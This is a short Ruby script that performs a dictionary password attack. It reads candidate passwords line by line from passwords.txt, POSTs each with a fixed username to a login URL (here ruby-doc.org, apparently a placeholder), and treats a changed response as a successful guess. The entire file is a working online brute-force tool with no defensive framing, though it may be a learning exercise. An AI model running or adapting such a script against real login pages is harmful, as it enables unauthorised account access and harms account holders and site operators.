require 'net/http'
require 'uri'

def is_password_wrong? password
		uri = URI.parse 'https://ruby-doc.org'
		response = Net::HTTP.post_form(uri, :login => 'aaa', :password => password).body
		response.include? "Ruby"
end

input = File.open("passwords.txt", "r")

while (line = input.gets)
	line.strip!
	print "Trying pass: #{line}..."

	if is_password_wrong? line
		puts "Error"
	else
		puts "Found!"
		input.close
		exit
	end
end
